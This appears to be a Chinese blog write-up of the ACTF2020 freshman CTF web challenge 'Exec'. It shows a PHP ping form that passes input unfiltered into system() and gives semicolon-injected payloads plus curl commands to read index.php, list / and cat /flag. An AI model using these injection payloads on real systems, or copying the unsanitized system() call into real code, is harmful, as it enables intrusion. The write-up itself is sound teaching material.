---
title: ACTF2020 新生赛 - Web - Exec
date: 2026-11-14 18:02:00
categories:
  - CTF
  - ACTF2020 新生赛
  - Web
tags:
  - 命令注入
  - system函数
  - 命令分隔符
  - ping
cover: /img/cover/blindfold-side-portrait.jpg
description: 命令注入入门 Web 题，PING 功能的 target 参数未经过滤直接拼进 PHP system("ping -c 3 ...")，用分号注入额外命令，列目录发现根目录 flag 并 cat 读取。
keywords:
  - 命令注入
  - RCE
  - system
  - 分号绕过
  - ACTF
ai: >-
  本题是 ACTF2020 新生赛的 Web 基础题，功能是输入 IP 执行 PING。POST 参数 target 被 index.php 直接拼进 system("ping -c 3 " . $target) 执行，没有任何过滤。先用分号注入 cat index.php 读自身源码确认拼接点，再执行 ls -la / 发现根目录 43 字节的 /flag，最后用 127.0.0.1;cat /flag 读取得到 flag。除分号外，管道符、&&、|| 同样可用。整题演示了用户输入直接进入 shell 命令这一最经典的命令注入模式，以及从信息探测、源码确认到读取目标文件的标准流程。
copyright_author: Hunter
---

> 结论先行：`target` 未过滤直接拼进 `system("ping -c 3 " . $target)`，用 `;` 注入任意命令，`cat /flag` 读取根目录 flag。

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | ACTF2020 新生赛 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

漏洞类型：命令注入（Command Injection）。

## 信息收集

访问首页，是一个 PING 功能，POST 参数 `target`，后端直接拼接进 shell 命令执行。

```html
<form method="post">
    <input type="text" name="target" placeholder="请输入需要ping的地址" />
</form>
```

## 漏洞分析

### 查看源码

命令注入读取 index.php 源码：

```text
POST target=127.0.0.1;cat index.php
```

源码核心：

```php
<?php
if (isset($_POST['target'])) {
    system("ping -c 3 ".$_POST['target']);
}
?>
```

可见用户输入 `target` 未做任何过滤，直接拼接进 `system()`，存在命令注入。

## 利用过程

用 `;` 分隔符注入额外命令：

```text
target=127.0.0.1;ls -la /
```

列出根目录，发现 `/flag` 文件（43 字节）。

### 读取 flag

```text
target=127.0.0.1;cat /flag
```

## 完整 EXP

```bash
# 1. 读源码确认注入点
curl -X POST "http://target:8080/" --data "target=127.0.0.1;cat index.php"

# 2. 列根目录，定位 flag
curl -X POST "http://target:8080/" --data "target=127.0.0.1;ls -la /"

# 3. 读取 flag
curl -X POST "http://target:8080/" --data "target=127.0.0.1;cat /flag"
```

## Flag

```text
flag{xxxx}
```

## 踩坑与总结

1. 用户输入 `target` 未过滤，直接拼接到 `system("ping -c 3 " . $target)`。
2. 使用 `;`（或 `|`、`&&`、`||`）分隔符注入额外系统命令。
3. flag 位于容器根目录 `/flag`，通过 `cat /flag` 读取。
4. 先读源码确认 sink、再列目录定位目标文件，比盲目 cat 更稳妥。
